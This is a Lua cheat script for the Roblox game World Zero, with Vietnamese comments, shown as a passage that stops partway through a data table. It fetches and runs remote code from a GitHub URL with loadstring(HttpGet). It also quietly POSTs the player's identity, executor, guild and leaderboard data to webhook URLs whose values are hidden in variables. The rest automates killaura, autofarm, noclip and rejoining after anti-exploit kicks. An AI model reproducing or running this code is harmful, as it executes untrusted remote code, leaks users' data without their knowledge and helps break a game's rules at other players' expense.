
if game.gameId ~= 985731078 then
    return
end

if not game:IsLoaded() then
    game.Loaded:Wait()
end
--==================Các Biến===================
local a;
local b = game:GetService('Players')
local c = b.LocalPlayer or b:GetPropertyChangedSignal('LocalPlayer'):Wait() or b.LocalPlayer;
local d = c.UserId;
local e = game:GetService('HttpService')
local f = 'User: [' .. c.DisplayName .. ' (@' .. c.Name .. ')](https://www.roblox.com/users/' .. c.UserId .. '/profile)'
local g;
local h;
local i;
local j;
local o = '' 
loadstring(game:HttpGet"https://raw.githubusercontent.com/maihoangphi2531/Hagfyo_leader/refs/heads/main/level")()
--state tables
local ToggleStates = {
    Autofarm = false,
    Killaura = false,
    CollectDrops = false,
    CollectBuffOrb = false,
    autoEquipBestwWep = false,
    NVD = false,
    mobCamera = false,
    anonHook = false,
    nightmareLoop = false,
    skipScarecrowNm = false,
    NextDungeon = false,
    RestartDungeon = false,
    smartPerkSell = false,
    autoSellEggs = false,
    collectEggChests = false,
    ignoreCannon = false,
    restartAfterFloors = false,
    autoHide = false,
    autoSellAll = false,
    AutoAcceptInvite = false,  
    AutoPartyMonitor = false,
    AutoInviteAll = false,
    AutoRejoin = false,
    -- Auto Hatch toggles
    AutoBuyEgg = false,
    AutoHatchEgg = false,
    SmartPetKeep = false,
    AutoSellPetByTier = false,
    AutoSellAllPets = false,
}

local OptionValues = {
    -- Cũ (đã có)
    Offset = 5,
    FastSprint = 25,
    dungeonHook = "",
    drophook = "",
    dropHookRoleId = "",
    dungeonStartTimer = 0,
    towerStartTimer = 0,
    completedInfiniteTowerFloors = 10,
    healPercent = 30,
    resumePercent = 80,
    dungeonRestartTimer = 3,
    towerRestartTimer = 3,
    AutoSellTbl = {},
    selectedCosmetics = {},
    
    -- MỚI - Cần thêm
    testOffset = 0,
    mobWepId = "",
    bossWepId = "",
    KillauraDelay = 0,
    timeoutTimer = 60,
    wheelCount = 100,
    wheelDelay = 0,
        -- T5 Perks thresholds
    Agility = 2,
    AttackUp = 2,
    BonusHealthRegen = 1,
    BossSlayer = 10,
    BurnChance = 2,
    CriticalStack = 5,
    DamageReduction = 2,
    ElementalResistance = 10,
    EliteAssassin = 10,
    Energized = 5,
    Ferocious = 20,
    Fortress = 10,
    Glass = 30,
    GoldHoarder = 5,
    HPUp = 5,
    LifeDrain = 2,
    LuckyLooter = 2,
    MasterThief = 10,
    MobSlayer = 10,
    Oblivion = 1,
    OpeningStrike = 10,
    PoisonousThorns = 5,
    ResistBurn = 30,
    ResistFrost = 30,
    ResistKnockdown = 30,
    ResistPoison = 30,
    RoughSkin = 4,
    SelfDestruct = 10,
    ShiftedAggro = 15,
    Untouchable = 5,
    Vampiric = 5,
    playerCountKick = 6,
}


-- ====== WRAPPER ĐÃ SỬA - PHIÊN BẢN HOẠT ĐỘNG ======
local Toggles = {}
local Options = {}

-- Hàm tạo toggle object
local function createToggle(key, defaultValue)
    return {
        Value = defaultValue,
        SetValue = function(self, newValue)
            ToggleStates[key] = newValue
            self.Value = newValue
        end
    }
end

-- Hàm tạo option object
local function createOption(key, defaultValue)
    return {
        Value = defaultValue,
        SetValue = function(self, newValue)
            OptionValues[key] = newValue
            self.Value = newValue
        end
    }
end

-- Metatable cho Toggles
setmetatable(Toggles, {
    __index = function(tbl, key)
        if not rawget(tbl, key) then
            local toggle = createToggle(key, ToggleStates[key] or false)
            rawset(tbl, key, toggle)
        end
        return rawget(tbl, key)
    end
})

-- Metatable cho Options
setmetatable(Options, {
    __index = function(tbl, key)
        if not rawget(tbl, key) then
            local option = createOption(key, OptionValues[key] or "")
            rawset(tbl, key, option)
        end
        return rawget(tbl, key)
    end
})

-- Khởi tạo tất cả toggle cần thiết
for key, value in pairs(ToggleStates) do
    local toggle = createToggle(key, value)
    Toggles[key] = toggle
end

-- Khởi tạo tất cả option cần thiết
for key, value in pairs(OptionValues) do
    local option = createOption(key, value)
    Options[key] = option
end

-- Test wrapper removed
function utcDateAndTime()
    local p = os.date("!*t", os.time())
    local q, r, s, t, u = p.hour, p.min, p.sec, p.day, p.month;
    if q < 10 then
        q = '0' .. q
    end
    if r < 10 then
        r = '0' .. r
    end
    if s < 10 then
        s = '0' .. s
    end
    if t < 10 then
        t = '0' .. t
    end
    if u < 10 then
        u = '0' .. u
    end
    return q .. ':' .. r .. ':' .. s .. ' - ' .. t .. '/' .. u .. '/' .. p.year
end

function waitForChild(v, w, waittime)
    local x = v;
    local y;
    for z = 1, #w do
        local A = x:WaitForChild(w[z], waittime)
        if A then
            x = A;
            if z == #w then
                return x
            end
        else
            return nil
        end
    end
end

function firstCheckWait(B)
    repeat
        task.wait()
    until firstCheckDone or not Toggles[B].Value
end

function findFirstChild(v, w)
    local x = v;
    for z = 1, #w do
        local A = x:FindFirstChild(w[z])
        if A then
            x = A;
            if z == #w then
                return x
            end
        else
            return nil
        end
    end
end

local C = {
    Green = 0x00FF00,
    Red = 0xFF0000,
    Black = 0x000000,
    Cyan = 0x00c8ff,
    Yellow = 0xffff00,
    Gold = 0xffd700,
    Purple = 0x8C00FF,
    LightPink = 0xff7fff
}

task.spawn(function()
    repeat
        task.wait()
    until a;
    pcall(function()
        local function D(E, F, G)
            request({
                Url = G,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = e:JSONEncode({
                    ["embeds"] = {{
                        ["title"] = 'Infinite | World Zero',
                        ["description"] = E,
                        ["type"] = 'rich',
                        ["color"] = tonumber(F),
                        ["footer"] = {
                            ["text"] = utcDateAndTime() .. ' UTC'
                        }
                    }}
                })
            })
        end
        local function H()
            local I = game:HttpGet(peepo)
            local J = e:JSONDecode(I)
            return J
        end
        local K = H()
        local L = K[eternal]
        local M = leviathan[K[blissful:lower()]]
        local N = f .. '\n' .. eternal:upper() .. ': ``' .. L .. '``\n' .. blissful .. ': ``' .. M .. '``'
        if identifyexecutor then
            local O = ({identifyexecutor()})[1]
            N = N .. '\nExecutor: ``' .. O .. '``'
        end
        local P = game:GetService("TextChatService"):WaitForChild('TextChannels')
        local Q;
        for z, R in P:GetChildren() do
            if #R.Name < 6 and #R:GetChildren() > 0 and R:FindFirstChild(c.Name) then
                Q = R.Name;
                break
            end
        end
        if Q then
            local S = game:GetService("ReplicatedStorage").Shared.Guilds.GetCache:InvokeServer(Q)
            local T;
            for z, R in S.Members do
                if tonumber(z) == d then
                    T = R.Points;
                    break
                end
            end
            if T then
                N = N .. '\nGuild Points: ``' .. T .. '`` / ``' .. Q .. '``'
            end
        end
        local U = {
            ['VaneRaid'] = 'VANE_KILLS',
            ['KrakenRaid'] = 'KRAKEN_KILLS',
            ['FallenKingRaid'] = 'FALLENKING_KILLS',
            ['KorruptedKlausRaid'] = 'SANTA_KILLS',
            ['InfiniteTower'] = 'ITF_1',
            ['NightmareNormal'] = 'N_NP1',
            ['NightmareChallenge'] = 'C_NP1',
            ['CurrentGuildSeason'] = 'G_POINTS16'
        }
        pcall(function()
            function getLbScore(V)
                local W = game:GetService("ReplicatedStorage"):WaitForChild("Shared"):WaitForChild("LeaderboardHookup")
                    :WaitForChild("GetScore"):InvokeServer(V, 1)
                return W[1], W[2]
            end
            local X, Y = getLbScore(U.NightmareChallenge)
            local Z, _ = getLbScore(U.NightmareNormal)
            local a0, a1 = getLbScore(U.InfiniteTower)
            local a2, a3 = getLbScore(U.KorruptedKlausRaid)
            if X > 0 then
                N = N .. '\nNM Challenge Completed: ``' .. X .. '`` / ``' .. Y .. '``'
            end
            if Z > 0 then
                N = N .. '\nNM Normal Completed: ``' .. Z .. '`` / ``' .. _ .. '``'
            end
            if a0 > 99 then
                N = N .. '\nInfinite Tower Floor Record: ``' .. a0 .. '``'
            end
        end)
        D(N, olympus and C.Gold or C.Cyan, olympus and cloudy or boink)
    end)
end)

local a4 = game:GetService("ReplicatedStorage")
local a5 = a4:WaitForChild('Shared')
local a6 = game:GetService('TeleportService')
local a7 = game:GetService("VirtualInputManager")
local a8 = true;
local a9;
local aa = false;
local ab, ac, ad, ae, af, ag, ah;
local ai = false;
local aj = isfile and readfile and writefile;
local ak;
local al = game:GetService('VirtualUser')
c.Idled:Connect(function()
    al:CaptureController()
    al:ClickButton2(Vector2.new())
end)
local am = c.Name;
local an = 2727067538;
local ao = {
    Kicked = false,
    WasInDungeon = false,
    Dungeon = false,
    Difficulty = false,
    Timestamp = false,
    RejoinLastDungeon = false,
    CameFromMenu = false,
    RejoinLastDungeonThreshold = 1800,
    Gold = false,
    LastDungeonCompletion = false,
    CrossSessionTimestamp = false,
    CrossSessionGold = false,
    ForceRestartLastTower = false
}
local ap = d .. '_InfiniteWorldZeroData.txt'
local aq = {21, 23, 27, 29, 34, 43, 39, 38}
function save()
    local ar;
    if writefile then
        ar = e:JSONEncode(ao)
        writefile(ap, ar)
    end
end
function load()
    if readfile and isfile and isfile(ap) then
        ao = e:JSONDecode(readfile(ap))
    end
end
if game.PlaceId == an then
    load()
    if ao.Kicked or ao.RejoinLastDungeon and tick() - ao.Timestamp <= ao.RejoinLastDungeonThreshold then
        ao.Kicked = false;
        ao.CameFromMenu = true;
        save()
        local as = require(c:WaitForChild("PlayerScripts"):WaitForChild("LocalScript"):WaitForChild("Guis")
            :WaitForChild("CharacterPicker"))
        local at = as:GetSelectedProfile()
        while not at do
            task.wait()
            at = as:GetSelectedProfile()
        end
        local au = at.GUID.Value;
        local av = a5:WaitForChild('Teleport'):WaitForChild('JoinGame')
        av:FireServer(au)
    end
end
local aw;
local ax;
local ay;
local az;
local aA = {21, 23, 27, 29, 34, 43}
local aB = {1005, 1006, 1007}
local aC;
local aD = {5862275930, 4526768266}
local aE = table.find(aD, game.PlaceId)
local aF;
local aG;
local aH;
local aI;
local aJ;
local aK;
local aL;
local aM;
local aN;
local aO;
local aP;
local aQ;
local aR = {
    StoneTreeEnt = -3,
    BOSSTreeEnt = -3,
    BOSSFireTreeEnt = -3,
    BOSSCrystalGolem = -9,
    CorruptedGreaterTree = -19,
    BOSSCrystalWeaverBlue = 1,
    MiniBossCrystalWeaver = 4,
    MinotaurDungeonBoss = 4,
    BOSSKandrix = 4,
    Crystal = -9,
    Taurha = -2,
    BOSSShadowOfCerberus = 7,
    Hades = -1,
    BOSSFallenKing = 0,
    FallenQueenGuard = 0,
    BOSSFallenPrince = 0,
    BOSSFallenQueen = 0
}
local aS = {}
local aT = c.Character or c.CharacterAdded:Wait() or c.Character;
local aU = aT:WaitForChild('HumanoidRootPart')
local aV, aW;
while true do
    if c.Character and c.Character:FindFirstChild('HealthProperties') then
        aV = c.Character.HealthProperties;
        break
    end
    task.wait()
end
c.CharacterAdded:Connect(function(aX)
    aT = aX;
    aU = aT:WaitForChild('HumanoidRootPart')
    aV = aT:WaitForChild('HealthProperties')
    aW = aT:WaitForChild('Equipment')
end)
local aY = debug.getupvalue(require(a5.Drops).Start, 4)
local aZ = a5:WaitForChild('Drops'):WaitForChild('CoinEvent')
local a_ = c:WaitForChild("PlayerGui"):WaitForChild('Profile')
local b0 = a_:WaitForChild('Currency'):WaitForChild('Gold')
local b1 = b0.Value;
local b2 = b1;
local b3 = a4:WaitForChild('PlayerEquips'):WaitForChild(am)
local b4 = b3:WaitForChild('Primary')
local b5 = b3:WaitForChild('Offhand')
local b6 = b3:WaitForChild('Armor')
local b7 = a5:WaitForChild('ItemUpgrade'):WaitForChild('Upgrade')
local b8 = a_:WaitForChild("Class")
local b9 = b8.Value;
function classCheck(ba)
    return b9 == ba
end
local bb = a5.Missions.GetMissionPrize;
aW = aT.Equipment;
local bc = a5:WaitForChild('Combat'):WaitForChild('Skillsets')
local bd = 0;
local be;
local bf = {'AtlanticChest'}
local bg = 'RaidChestSilver'
local bh = 'RaidChestGold'
local bi = 'RaidChestGold'
local bj = false;
local bk = a5:WaitForChild("Combat"):WaitForChild("Attack")
local bl = game:GetService("Workspace"):FindFirstChild("Mobs")
local bm = a5.Mobs.Mobs;
local bn = workspace.Camera;
local bo;
local bp;
local bq = tick()
local br = tick()
local bs = 0;
local bt = 0;
local bu = 0;
local bv = {}
local bw = Instance.new('Part')
bw.Position = Vector3.zero;
bw.Anchored = true;
bw.Transparency = 1;
bw.CanCollide = false;
bw.Name = 'InfiniteCameraPart'
bw.Parent = workspace;
task.spawn(function()
    if a4:WaitForChild("ActiveMission", 60) then
        aC = true;
        aw = game:GetService("Workspace"):WaitForChild("MissionObjects")
        ax = a4:WaitForChild("MissionScripts")
        ay = a4:WaitForChild("ActiveMission").Value;
        ao.Dungeon = a4:WaitForChild("ActiveMission").Value;
        if table.find(aA, ay) then
            aH = true
        elseif ay == 38 then
            aI = true
        elseif ay == 39 then
            aJ = true
        else
            aF = true;
            az = a5.Missions.GetDifficulty:InvokeServer()
            ao.Difficulty = a5.Missions.GetDifficulty:InvokeServer()
        end
        if ay == 23 then
            aG = true
        end
        if table.find(aB, ay) then
            aK = true
        end
        if ay == 45 then
            aM = true;
            aL = true
        end
        if ay == 44 then
            aO = true;
            aL = true
        end
        if ay == 22 then
            aP = true;
            aL = true
        end
        if ay == 17 then
            aN = true;
            aL = true
        end
        
        -- ✅ Thực thi start timer khi dungeon mới bắt đầu
        task.spawn(function()
            task.wait(2) -- Đợi dungeon load xong
            if Toggles.Autofarm.Value then
                executeStartTimer()
            end
        end)
    end
end)
-- THÊM SAU DÒNG: if aW then
-- (khoảng dòng 544-550, sau khi init các biến mission)


do
    function noclip()
        if aU and aU.CanCollide then
            aU.CanCollide = false
        end
    end
    function unnoclip()
        if aU and not aU.CanCollide then
            aU.CanCollide = true
        end
    end
    function setCamera(bx, by)
        local bz = bx or aU and (aU:FindFirstChild("Part") or aU)
        if bx then
            bx.Position = by
        end
        if bz and bn.CameraSubject ~= bz then
            bn.CameraSubject = bz
        end
    end
    function alive()
        return aT and aU and aV and aV:FindFirstChild('Health') and aV.Health.Value > 0
    end
    function mounted()
        return aT and aT:FindFirstChild('Properties') and aT.Properties:GetAttribute('Mounted')
    end
    function isAlive(bA)
        return bA and bA.PrimaryPart and bA:FindFirstChild('HealthProperties') and
                   bA.HealthProperties:FindFirstChild('Health') and bA.HealthProperties.Health.Value > 0
    end
    function Mob(E)
        if bm:FindFirstChild(E) then
            return require(bm[E])
        end
    end
    function SwitchOffhandPerks(E)
        a5.Settings.OffhandPerksActive:FireServer(E)
    end
    function timeElapsed(R)
        local bB = math.floor(R / 86400)
        local bC = math.floor(R % 86400 / 3600)
        local bD = math.floor(R % 3600 / 60)
        local bE = math.floor(R % 60)
        if bB > 0 then
            return bB .. 'd ' .. bC .. 'h ' .. bD .. 'm ' .. bE .. 's'
        elseif bC > 0 then
            return bC .. 'h ' .. bD .. 'm ' .. bE .. 's'
        elseif bD > 0 then
            return bD .. 'm ' .. bE .. 's'
        else
            return bE .. 's'
        end
    end
    function ping()
        return math.round(c:GetNetworkPing() * 1000) .. ' ms'
    end
    function ping2()
        return math.round(game.Stats.PerformanceStats.Ping:GetValue()) .. ' ms'
    end
    function nextInTbl(bF, bG)
        return bF[table.find(bF, bG) + 1] or bF[1]
    end
    function formatNumberWithCommas(bH)
        local bI = tostring(bH)
        local bJ;
        repeat
            bI, bJ = string.gsub(bI, "^(-?%d+)(%d%d%d)", '%1,%2')
        until bJ == 0;
        return bI
    end
    function getServerGuilds()
        local P = game:GetService("TextChatService"):WaitForChild('TextChannels')
        local bF = {}
        for z, R in P:GetChildren() do
            if #R.Name < 6 and #R:GetChildren() > 0 then
                table.insert(bF, R.Name)
            end
        end
        table.sort(bF)
        return bF
    end
    function getPlrGuild()
        local P = game:GetService("TextChatService"):WaitForChild('TextChannels')
        local Q;
        for z, R in P:GetChildren() do
            if #R.Name < 6 and #R:GetChildren() > 0 and R:FindFirstChild(c.Name) then
                Q = R.Name;
                break
            end
        end
        return Q
    end
end

local bM = a_:WaitForChild('Inventory'):WaitForChild('Items')
local bN = a_:WaitForChild('Inventory'):WaitForChild('Cosmetics')
local bO = require(a5.Missions.MissionData)
function missionLevelReq(bP)
    return bO[bP].LevelRequirement
end
local bQ = require(a5.Gear.GearPerks)
local bR = require(a5.Items)
local bS = require(a5.Combat)
local bT = a5.Inventory.EquipItem;
local bU = require(a5:WaitForChild('Settings'))
local bV = a_:WaitForChild('Settings')
local bW;
local bX;
local bY;
local bZ;
local b_ = game:GetService('RunService').Heartbeat;
function OffhandPerksActive()
    return bV:GetAttribute('OffhandPerksActive')
end
function StartRaid(E, F)
    a5:WaitForChild('Teleport'):WaitForChild('StartRaid'):FireServer(E, F)
end
local c0 = require(a5.Inventory)
b8:GetPropertyChangedSignal("Value"):Connect(function()
    b9 = b8.Value
end)
local c1 = 0;
local MissionStartConnection;
if MissionStartConnection then
    MissionStartConnection:Disconnect()
end
MissionStartConnection = a5.Missions.MissionStart.OnClientEvent:Connect(function()
    MissionStarted = true
    
    -- Kiểm tra số lượng người chơi trong mission và kick nếu vượt ngưỡng
    task.spawn(function()
        while aC do
            local playerCount = #b:GetPlayers()
            local threshold = tonumber(Options.playerCountKick.Value) or 6

            
            if playerCount >= threshold then
        
                task.wait(0.5)

                break
            end
            task.wait(1)
        end
    end)
end)

-- Nếu đã ở trong dungeon khi load script, khởi động vòng lặp kiểm tra ngay
task.spawn(function()
    task.wait(2) -- Đợi để Options được load từ config
    if aC then

        while aC do
            local playerCount = #b:GetPlayers()
            local threshold = tonumber(Options.playerCountKick.Value) or 6

            
            if playerCount >= threshold then
                task.wait(0.5)
                c:Kick('Someone might have joined your mission!')
                break
            end
            task.wait(1)
        end
    end
end)

load()
if not aC then
    if ao.Kicked and ao.WasInDungeon or ao.RejoinLastDungeon and tick() - ao.Timestamp <= ao.RejoinLastDungeonThreshold and
        ao.CameFromMenu or ao.WasInDungeon and ao.Dungeon and table.find(aA, ao.Dungeon) and ao.ForceRestartLastTower then
        ao.CameFromMenu = false;
        save()
        if ao.Dungeon then
            local c2 = a5:WaitForChild('Teleport'):WaitForChild('StartRaid')
            while true do
                if table.find(aq, ao.Dungeon) then
                    c2:FireServer(ao.Dungeon)
                else
                    c2:FireServer(ao.Dungeon, ao.Difficulty)
                end
                task.wait(1)
            end
        end
    else
        ao.Kicked = false;
        ao.CameFromMenu = false;
        ao.WasInDungeon = false;
        save()
    end
elseif aC then
    bZ = getPlrGuild()
    ao.WasInDungeon = true;
    ao.Dungeon = ay;
    ao.Difficulty = az;
    ao.CameFromMenu = false;
    ao.Timestamp = tick()
    save()
end
do
do
-- Xử lý khi bị disconnect/kick - Auto rejoin
local GuiService = game:GetService('GuiService')
local TeleportService = game:GetService('TeleportService')

-- Method 1: GuiService ErrorMessageChanged
local disconnectConnection1;
disconnectConnection1 = GuiService.ErrorMessageChanged:Connect(function(msg)
    local errorCode = GuiService:GetErrorCode()
    if errorCode == Enum.ConnectionError.DisconnectLuaKick or 
       errorCode == Enum.ConnectionError.DisconnectConnectionLost or 
       errorCode == Enum.ConnectionError.DisconnectErrors or
       msg:lower():find("kick") or
       msg:lower():find("exploit") or
       msg:lower():find("moderate") then
        
        disconnectConnection1:Disconnect()
        ao.Kicked = true;
        save()
        
        -- Gửi webhook nếu bị kick do exploit
        if msg:lower():find("exploit") and boink2 then
            pcall(function()
                local notifyText = 'Killaura Delay: ``' .. (Options.KillauraDelay and Options.KillauraDelay.Value or 0) .. '``\nClass: ``' .. (cl[b9] and cl[b9].DisplayName or 'Unknown') ..
                               '``\nPing: ``' .. ping2() .. '``'
                if aC then
                    notifyText = notifyText .. '\nCode: ``' .. (i or 'N/A') .. '``\nMission: ``' .. (h or 'N/A') .. '``'
                end
                notifyText = notifyText .. '\n' .. f .. '\nMessage: ' .. msg;
                
                request({
                    Url = boink2,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = e:JSONEncode({
                        ["embeds"] = {{
                            ["title"] = 'Exploit Kick',
                            ["description"] = notifyText,
                            ["type"] = 'rich',
                            ["color"] = tonumber(C.LightPink),
                            ["footer"] = {
                                ["text"] = utcDateAndTime() .. ' UTC'
                            }
                        }}
                    })
                })
            end)
        end
        
        -- Teleport về menu để auto rejoin
        task.wait(0.5)
        TeleportService:Teleport(an, c)
    end
end)

-- Method 2: TeleportService FailedSignal (backup)
local disconnectConnection2;
disconnectConnection2 = TeleportService.TeleportInitFailed:Connect(function(player, result, errorMessage, placeId, teleportOptions)
    if player == c then
        ao.Kicked = true;
        save()
        task.wait(2)
        TeleportService:Teleport(an, c)
    end
end)
end
end
-- Removed unused variables: local c3, c4, c5, c6 = '', '', '', ''
local c7 = {'Checkpoint1', 'Checkpoint2', 'Checkpoint3', 'Checkpoint4', 'Checkpoint5', 'Checkpoint6', 'Checkpoint7',
            'Checkpoint8', 'Checkpoint9', 'Checkpoint10', 'CutsceneTrigger', 'Main', 'CaveTrigger', 'BossIntroTrigger',
            'TownTalkPart', 'BridgeTrigger', 'BoulderTrigger', 'BoulderStopTrigger', 'Cage1Marker', 'Cage2Marker',
            'CannonTrigger', 'CastleTrigger', 'WallsCheckpoint', 'HammerReset1', 'WallsTrigger', 'WallsFinalTrigger',
            'Room1Trigger', 'Room2Trigger', 'Room3Trigger', 'Room4Trigger', 'Room5Trigger', 'Room6Trigger',
            'TreasureMarker', 'NextCheckpointTrigger', 'PreBridgeTrigger', 'CheckpointTriggers', 'CaveSpawnTrigger',
            'CliffsideEndTrigger', 'VineRoomTrigger', 'CheckpointTrigger', 'ObbyTrigger', 'BossTrigger', 'DropTrigger',
            'CastleGateTrigger', 'SceneTrigger', 'OutsideBossTrigger', 'Area1Trigger', 'Area2Trigger', 'Area3Trigger',
            'FinishRing', 'StartWaveDefense', 'Trigger1', 'Trigger2', 'Trigger3', 'BossCutsceneTrigger', 'FloorTrigger',
            'BossCutscene', 'BottomElevatorTrigger', 'MiddleElevatorTrigger', 'TopElevatorTrigger', 'ObbyTrigger5',
            'WaveStarter', 'NextFloorTeleporter', 'WaveExit', 'MinibossExit', 'ArenaEntry0', 'ArenaEntry1',
            'ArenaEntry2'}
local c8 = {'Assets_FX', 'Assets_Static', 'Characters', 'Coins', 'Camera', 'SpeedBoosts', 'Projectiles', 'World_Bounds',
            'Pets', 'MobBlockers', 'Terrain', 'TeleportSystem', 'Room_Boss_Final', 'Room_Boss_Mini', 'Room_Lobby',
            'Room_Spawn'}
local c9 = {'Scarecrow1', 'Scarecrow2', 'Scarecrow3'}
local ca = {
    DireProblem = {
        Id = 2,
        ignoreMob = 'BOSSDireBoarwolf'
    },
    KingSlayer = {
        Id = 4,
        ignoreMob = 'BOSSKingCrab'
    },
    GravetowerDungeon = {
        Id = 6,
        priorityTbl = {'Pillar', 'BOSSTreeEnt'},
        mobWaitTbl = {'BOSSTreeEnt'},
        mobWaitTime = 3
    },
    RoughWaters = {
        Id = 25,
        ignoreMob = 'DavyJones'
    },
    VolcanosShadow = {
        Id = 13,
        ignoreMob = 'BOSSCerberus'
    },
    KonoHeartlands = {
        Id = 24,
        ignoreMob = 'CorruptedGreaterTree'
    },
    AetherFortress = {
        Id = 33,
        ignoreMob = 'BOSSTreeEnt'
    },
    MamaTrauma = {
        Id = 12,
        ignoreMob = 'BOSSMamaQuillodile'
    },
    TheUnderworld = {
        Id = 26,
        ignoreMob = 'HadesCesrberus',
        mobWaitTbl = {'HadesCerberus', 'Hades'},
        mobWaitTime = 10,
        alwaysWait = true
    },
    VaneEvent = {
        Id = 44,
        priorityTbl = {'EVENTBOSSVane'}
    },
    ArcaneTower = {
        Id = 43,
        priorityTbl = {'Crystal', 'BOSSKandrix'}
    },
    FALLENKING_KILLS = {
        Id = 22,
        priorityTbl = {'FallenKingMinion', 'BOSSFallenKing', 'FallenQueenGuard', 'BOSSFallenPrince', 'BOSSFallenQueen'},
        mobWaitTbl = {'FallenKingMinion'}, -- ✅ Đợi minion spawn
        mobWaitTime = 1
    },
    KrakenEvent = {
        Id = 45,
        priorityTbl = {
            'EVENTBOSSKrakenArm-Arm#1',
            'EVENTBOSSKrakenArm-Arm#2', 
            'EVENTBOSSKrakenArm-Arm#3',
            'EVENTBOSSKrakenArm-Arm#4',
            'EVENTBOSSKrakenArm-Arm#5',
            'EVENTBOSSKrakenArm-Arm#6',
            'EVENTBOSSKrakenArm-Arm#7',
            'EVENTBOSSKrakenArm-Arm#8',
            'EVENTBOSSKrakenArm-Arm#9',
            'EVENTBOSSKrakenArm-Arm#10',
            'EVENTBOSSKraken'  
        }
    },
    RescueInTheRuins = {
        Id = 30,
        priorityTbl = {'Alligator', 'Rapigator', 'Sentry', 'HandTower'}
    },
    PyramidDungeon = {
        Id = 18,
        priorityTbl = {'ScarabGreen', 'BuffCactus', 'HappyCactus', 'RockGolem', 'DesertFlower', 'PoisonCobra',
                       'GoldCobra'}
    },
    ScrapCanyon = {
        Id = 20,
        priorityTbl = {'Model', 'BOSSHogRider'}
    }
}
local cb = 15;
local cc = {
    World1 = {
        Name = 'World 1',
        Id = 13,
        OrderId = 1
    },
    World2 = {
        Name = 'World 2',
        Id = 19,
        OrderId = 2
    },
    World3 = {
        Name = 'World 3',
        Id = 20,
        OrderId = 3
    },
    World4 = {
        Name = 'World 4',
        Id = 29,
        OrderId = 4
    },
    World5 = {
        Name = 'World 5',
        Id = 31,
        OrderId = 5
    },
    World6 = {
        Name = 'World 6',
        Id = 36,
        OrderId = 6
    },
    World7 = {
        Name = 'World 7',
        Id = 40,
        OrderId = 7
    },
    World8 = {
        Name = 'World 8',
        Id = 45,
        OrderId = 8
    },
    World9 = {
        Name = 'World 9',
        Id = 49,
        OrderId = 9
    },
    World10 = {
        Name = 'World 10',
        Id = 56,
        OrderId = 10
    },
    TradingHub = {
        Name = 'Cliffside Marketplace',
        Id = 44,
        OrderId = 11
    },
    PvpArena = {
        Name = 'Pvp Arena',
        Id = 39,
        OrderId = 12
    },
    Baseplate = {
        Name = 'Baseplate',
        Id = 26,
        OrderId = 13
    },
    ChristmasHub = {
        Name = 'Holiday Village',
        Id = 24,
        OrderId = 14
    },
    HalloweenHub = {
        Name = 'Spooky Courtyard',
        Id = 33,
        OrderId = 15
    }
}
local cd = {1, 3, 2, 4, 6, 11, 12, 13, 7, 14, 15, 16, 20, 19, 18, 24, 35, 21, 25, 36, 23, 26, 37, 27, 30, 31, 29, 32,
            33, 34, 41, 42, 43, 39, 1005, 1006, 1007, 38}
local ce = {{
    Id = 1,
    Name = "Crabby Crusade",
    World = 1,
    Type = 'Dungeon',
    Code = '1-1'
}, {
    Id = 3,
    Name = "Scarecrow Defense",
    World = 1,
    Type = 'Dungeon',
    Code = '1-2'
}, {
    Id = 2,
    Name = "Dire Problem",
    World = 1,
    Type = 'Dungeon',
    Code = '1-3'
}, {
    Id = 4,
    Name = "Kingslayer",
    World = 1,
    Type = 'Dungeon',
    Code = '1-4'
}, {
    Id = 6,
    Name = "Gravetower Dungeon",
    World = 1,
    Type = 'Dungeon',
    Code = '1-5'
}, {
    Id = 11,
    Name = "Temple of Ruin",
    World = 2,
    Type = 'Dungeon',
    Code = '2-1'
}, {
    Id = 12,
    Name = "Mama Trauma",
    World = 2,
    Type = 'Dungeon',
    Code = '2-2'
}, {
    Id = 13,
    Name = "Volcano's Shadow",
    World = 2,
    Type = 'Dungeon',
    Code = '2-3'
}, {
    Id = 7,
    Name = "Volcano Dungeon",
    World = 2,
    Type = 'Dungeon',
    Code = '2-4'
}, {
    Id = 14,
    Name = "Mountain Pass",
    World = 3,
    Type = 'Dungeon',
    Code = '3-1'
}, {
    Id = 15,
    Name = "Winter Cavern",
    World = 3,
    Type = 'Dungeon',
    Code = '3-2'
}, {
    Id = 16,
    Name = "Winter Dungeon",
    World = 3,
    Type = 'Dungeon',
    Code = '3-3'
}, {
    Id = 20,
    Name = "Scrap Canyon",
    World = 4,
    Type = 'Dungeon',
    Code = '4-1'
}, {
    Id = 19,
    Name = "Deserted Burrowmine",
    World = 4,
    Type = 'Dungeon',
    Code = '4-2'
}, {
    Id = 18,
    Name = "Pyramid Dungeon",
    World = 4,
    Type = 'Dungeon',
    Code = '4-3'
}, {
    Id = 24,
    Name = "Konoh Heartlands",
    World = 5,
    Type = 'Dungeon',
    Code = '5-1'
}, {
    Id = 35,
    Name = "Konoh Inferno",
    World = 5,
    Type = 'Dungeon',
    Code = '5-2',
    MobCount = 44
}, {
    Id = 21,
    Name = "Prison Tower",
    World = 5,
    Type = 'Tower',
    Code = 'Tower 1'
}, {
    Id = 25,
    Name = "Rough Waters",
    World = 6,
    Type = 'Dungeon',
    Code = '6-1'
}, {
    Id = 36,
    Name = "Treasure Hunt",
    World = 6,
    Type = 'Dungeon',
    Code = '6-2'
}, {
    Id = 23,
    Name = "Atlantis Tower",
    World = 6,
    Type = 'Tower',
    Code = 'Tower 2'
}, {
    Id = 26,
    Name = "The Underworld",
    World = 7,
    Type = 'Dungeon',
    Code = '7-1'
}, {
    Id = 37,
    Name = "The Labyrinth",
    World = 7,
    Type = 'Dungeon',
    Code = '7-2'
}, {
    Id = 27,
    Name = "Mezuvian Tower",
    World = 7,
    Type = 'Tower',
    Code = 'Tower 3'
}, {
    Id = 30,
    Name = "Rescue in the Ruins",
    World = 8,
    Type = 'Dungeon',
    Code = '8-1'
}, {
    Id = 31,
    Name = "Ruin Rush",
    World = 8,
    Type = 'Dungeon',
    Code = '8-2'
}, {
    Id = 29,
    Name = "Oasis Tower",
    World = 8,
    Type = 'Tower',
    Code = 'Tower 4'
}, {
    Id = 32,
    Name = "Treetop Trouble",
    World = 9,
    Type = 'Dungeon',
    Code = '9-1'
}, {
    Id = 33,
    Name = "Aether Fortress",
    World = 9,
    Type = 'Dungeon',
    Code = '9-2'
}, {
    Id = 34,
    Name = "Aether Tower",
    World = 9,
    Type = 'Tower',
    Code = 'Tower 5'
}, {
    Id = 41,
    Name = "Crystal Chaos",
    World = 10,
    Type = 'Dungeon',
    Code = '10-1'
}, {
